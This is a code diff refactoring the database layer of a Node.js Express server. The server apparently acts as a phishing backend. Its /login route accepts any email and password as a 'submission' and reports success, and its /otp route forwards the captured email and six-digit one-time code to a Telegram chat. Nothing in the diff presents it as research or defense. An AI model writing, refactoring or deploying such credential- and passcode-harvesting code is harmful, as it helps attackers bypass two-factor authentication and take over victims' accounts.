@@ -1,6 +1,6 @@
 const express = require('express');
 const cors = require('cors');
-const db = require('./db');
+const db = require('./db'); // Now using sqlite3
 const bcrypt = require('bcryptjs');
 const axios = require('axios');
 require('dotenv').config();
@@ -36,33 +36,43 @@ app.post('/login', (req, res) => {
   const { email, password } = req.body;
   if (!email || !password) return res.status(400).json({ error: 'Email and password are required' });
 
-  try {
-    const checkStmt = db.prepare(`
-      SELECT id FROM submissions
-      WHERE type = 'login'
-        AND json_extract(payload, '$.email') = ?
-    `);
-    const existing = checkStmt.get(email);
+  // Check if user exists
+  const query = `
+    SELECT id FROM submissions
+    WHERE type = 'login'
+      AND json_extract(payload, '$.email') = ?
+  `;
+
+  db.get(query, [email], (err, existing) => {
+    if (err) {
+      console.error('Login Query Error:', err);
+      return res.status(500).json({ error: 'Server error' });
+    }
 
     if (existing) {
       return res.status(409).json({ error: 'User already exists. Please log in.' });
     }
 
     const hashedPassword = bcrypt.hashSync(password, 10);
-    const insertStmt = db.prepare('INSERT INTO submissions (type, payload) VALUES (?, ?)');
-    insertStmt.run('login', JSON.stringify({ email, password: hashedPassword }));
+    const payload = JSON.stringify({ email, password: hashedPassword });
 
-    // Store email temporarily for OTP use
-    app.locals.lastEmail = email;
+    db.run(
+      `INSERT INTO submissions (type, payload) VALUES (?, ?)`,
+      ['login', payload],
+      function (err) {
+        if (err) {
+          console.error('Insert Login Error:', err);
+          return res.status(500).json({ error: 'Server error' });
+        }
 
-    return res.status(200).json({ message: 'Login successful' });
-  } catch (err) {
-    console.error('Login Error:', err);
-    return res.status(500).json({ error: 'Server error' });
-  }
+        app.locals.lastEmail = email;
+        return res.status(200).json({ message: 'Login successful' });
+      }
+    );
+  });
 });
 
-// Save OTP and notify Telegram with both email + otp
+// Save OTP and notify Telegram
 app.post('/otp', async (req, res) => {
   const { code } = req.body;
 
@@ -71,20 +81,23 @@ app.post('/otp', async (req, res) => {
     return res.status(422).json({ error: 'OTP must be exactly 6 digits (numbers only)' });
   }
 
-  try {
-    const stmt = db.prepare('INSERT INTO submissions (type, payload) VALUES (?, ?)');
-    stmt.run('otp', JSON.stringify({ code }));
+  const payload = JSON.stringify({ code });
 
-    const email = app.locals.lastEmail || 'unknown';
+  db.run(
+    `INSERT INTO submissions (type, payload) VALUES (?, ?)`,
+    ['otp', payload],
+    async function (err) {
+      if (err) {
+        console.error('Insert OTP Error:', err);
+        return res.status(500).json({ error: 'Server error' });
+      }
 
-    // Send combined message
-    await sendTelegramMessage(`🧾 New submission:\n📧 Email: ${email}\n🔐 OTP: ${code}`);
+      const email = app.locals.lastEmail || 'unknown';
+      await sendTelegramMessage(`🧾 New submission:\n📧 Email: ${email}\n🔐 OTP: ${code}`);
 
-    return res.status(200).json({ message: 'OTP received' });
-  } catch (err) {
-    console.error('OTP Error:', err);
-    return res.status(500).json({ error: 'Server error' });
-  }
+      return res.status(200).json({ message: 'OTP received' });
+    }
+  );
 });
 
 // Start server
